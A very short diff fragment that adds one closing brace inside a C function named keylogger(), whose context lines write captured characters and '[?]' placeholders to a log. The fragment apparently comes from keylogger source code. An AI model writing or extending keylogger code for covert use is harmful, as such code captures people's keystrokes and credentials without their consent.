@@ -239,6 +239,7 @@ void keylogger()\n\
 					write(log, \"[?]\", 3);\n\
 			}\n\
 		}\n\
+	}\n\
 }\n\
 \n\
 \n\
